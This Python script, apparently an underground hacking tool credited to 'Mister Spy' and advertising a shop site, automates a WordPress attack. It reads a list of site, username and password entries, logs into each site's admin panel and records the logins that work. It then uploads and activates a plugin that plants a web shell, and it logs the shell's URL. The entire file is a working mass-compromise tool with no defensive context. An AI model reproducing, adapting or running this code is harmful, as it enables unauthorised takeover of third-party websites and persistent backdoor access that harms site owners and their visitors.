from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import requests
from selenium.webdriver.chrome.options import Options
from colorama import init



# think twice code once bitchs , Mr Spy For the history
def remindme(url):
    global driver
    try:
        driver = webdriver.Chrome("chromedriver.exe")
        ur = url.rstrip()
        ch = ur.split('\n')[0].split('|')
        link = ch[0]
        user = ch[1]
        passx = ch[2]
        driver.get(link + "/wp-login.php")

        inputElement = driver.find_element_by_id("user_login")
        inputElement.send_keys(user)
        inputElement = driver.find_element_by_id("user_pass")
        inputElement.send_keys(passx)
        inputElement.send_keys(Keys.ENTER)
        if "Remind me later=" in str(driver.current_url):
            print "Success Login " + link
            open("workingLogins.txt", "a").write(url + '\n')
            link = str(driver.current_url).split("/wp-admin")[0]
            driver.get(link + '/wp-admin/plugin-install.php?tab=upload')
            driver.find_element_by_id("pluginzip").send_keys("C:\ubb.zip")
            driver.find_element_by_id("install-plugin-submit").click()
            driver.find_element_by_link_text('Activate Plugin').click()
            open("doneupload.txt", "a").write(link + '/wp-content/plugins/ubb/shell20200510.php' + '\n')
            print "Success Uploading " + link + '/wp-content/plugins/ubb/shell20200510.php'
            driver.close()
        else:
            print "Success Login " + link
            open("workingLogins.txt", "a").write(url + '\n')
            link = str(driver.current_url).split("/wp-admin")[0]
            driver.get(link + '/wp-admin/plugin-install.php?tab=upload')
            driver.find_element_by_id("pluginzip").send_keys("C:\ubb.zip")
            driver.find_element_by_id("install-plugin-submit").click()
            driver.find_element_by_link_text('Activate Plugin').click()
            open("doneupload.txt", "a").write(link + '/wp-content/plugins/ubb/shell20200510.php' + '\n')
            print "Success Uploading " + link + '/wp-content/plugins/ubb/shell20200510.php'
            driver.close()
    except:
        driver.close()

init()
print("""\033[93m

 __          _______             
 \ \        / /  __ \            
  \ \  /\  / /| |__) |   _ _ __  
   \ \/  \/ / |  ___/ | | | '_ \ 
    \  /\  /  | |   | |_| | |_) |
     \/  \/   |_|    \__,_| .__/ 
                          | |    
                          |_|    


Coded By Mister Spy
Join t-shop.to
""".format(a="\033[95m", b="\033[93m"))
liists = raw_input('Enter Your List :')
with open(liists) as f:
    for url in f:
        remindme(url)
